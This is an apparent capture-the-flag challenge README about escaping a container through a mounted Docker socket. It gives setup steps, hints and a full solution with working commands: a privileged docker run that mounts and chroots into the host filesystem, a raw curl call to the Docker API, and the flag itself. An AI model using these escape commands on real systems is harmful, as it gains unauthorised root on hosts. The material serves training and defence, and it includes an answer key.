# Challenge 2 — Docker Socket Escape

**Difficulty:** Hard
**Category:** Linux Privilege Escalation / Container Escape
**Flag:** on the host at `/host-simulation/flag.txt`

---

## Story

You are **Django**. You've been locked inside a container — Candie's most secure cell.
No SUID binaries. No misconfigured sudo. No cron jobs.

But Dr. Schultz left you one gift before he died:
the Docker socket is mounted inside your cage.
The warden left the keys on the wall.

Use the Docker daemon to break out.

---

## Setup

```bash
docker build -t ctf-linux-hard-2 .

# The docker socket must be mounted from the host — this is the vulnerability
docker run -it --rm \
  -v /var/run/docker.sock:/var/run/docker.sock \
  -v /host-simulation:/host-simulation \
  ctf-linux-hard-2
```

> The `-v /var/run/docker.sock` flag simulates a common real-world misconfiguration
> where developers mount the Docker socket inside containers for CI/CD or monitoring.

---

## Background: Docker Socket Escape

`/var/run/docker.sock` is the Unix socket the Docker daemon listens on.
Whoever can write to it can issue Docker API commands — including spawning new containers.

If you are inside a container that has the Docker socket mounted, you can:
1. Use the `docker` CLI (or raw API calls) to spin up a **new** privileged container
2. Mount the **host filesystem** into that new container
3. Read, write, or execute anything on the host — including chroot into it

This is a full host escape. The container boundary ceases to exist.

---

## Hints

<details>
<summary>Hint 1</summary>
Check what is available to you:

```bash
ls -la /var/run/docker.sock
docker ps
docker images
```

If you can talk to the Docker daemon, you can escape.
</details>

<details>
<summary>Hint 2</summary>
Spin up a new container that mounts the host filesystem at `/mnt/host`:

```bash
docker run -it --rm \
  -v /:/mnt/host \
  --privileged \
  ubuntu:22.04 \
  chroot /mnt/host bash
```

You now have a root shell on the host.
</details>

<details>
<summary>Hint 3</summary>
Once inside the chroot shell, you are root on the host. The flag is at:

```bash
cat /host-simulation/flag.txt
```
</details>

---

## Solution

<details>
<summary>Click to reveal — try on your own first!</summary>

### Step 1 — Confirm the socket is available

```bash
ls -la /var/run/docker.sock
docker images
```

The socket is accessible and `django` is in the `docker` group.

### Step 2 — Escape by spawning a privileged container with host filesystem

```bash
docker run -it --rm \
  -v /:/mnt/host \
  --privileged \
  ubuntu:22.04 \
  chroot /mnt/host bash
```

Breaking this down:
- `-v /:/mnt/host` — mounts the **host root filesystem** into the new container
- `--privileged` — removes all container security restrictions
- `chroot /mnt/host bash` — changes root into the mounted host, giving a native host shell

### Step 3 — Read the flag

```bash
cat /host-simulation/flag.txt
```

```
CTF{3sc4p3d_c4ndyl4nd_dj4ng0_1s_fr33}
```

### If docker CLI is not available — use the raw API

```bash
# Escape using only curl and the socket
curl -s --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/containers/create" \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:22.04","Cmd":["/bin/bash"],"Binds":["/:/mnt/host"],"Privileged":true}'
```

### Why this works

The Docker socket grants full control over the Docker daemon, which runs as root.
Any process that can write to the socket effectively has root on the host.
Mounting `/var/run/docker.sock` into a container — even a "restricted" one —
completely defeats container isolation. Never mount the Docker socket unless absolutely
necessary, and if you must, protect access with authorization plugins (e.g., OPA, Falco).

</details>
